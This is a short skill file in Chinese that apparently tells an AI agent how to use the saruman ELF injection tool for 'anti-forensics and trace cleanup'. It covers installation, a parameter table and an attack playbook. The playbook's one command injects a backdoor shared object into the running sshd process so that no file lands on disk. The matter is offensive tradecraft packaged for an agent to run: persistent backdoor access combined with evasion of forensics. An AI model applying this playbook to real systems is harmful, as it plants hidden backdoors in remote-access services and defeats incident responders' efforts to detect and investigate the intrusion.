---
name: saruman-anti-forensic
description: 渗透工具 skill:saruman 的安装、参数速查与攻击场景 playbook。当任务涉及 反取证与痕迹清理 需要调用 saruman 时使用。
---

# saruman

- 攻击大类:C20 反取证与痕迹清理
- 上游仓库:https://github.com/elfmaster/saruman
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/elfmaster/saruman && cd saruman && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./saruman target_bin payload.so` | 将 ELF 动态注入目标进程内存 |
| `-p pid` | 附加模式 |
| `--clean` | 退出时清理痕迹 |

## 攻击场景 Playbook

### ELF 内存注入规避磁盘取证

```bash
./saruman /usr/sbin/sshd ./backdoor.so  # 注入后目标进程内执行,不留磁盘文件
```

## 注意事项

PoC 级工具,现代内核 hardening(ptrace_scope/SELinux)下多需降防护,研究价值大于实战。
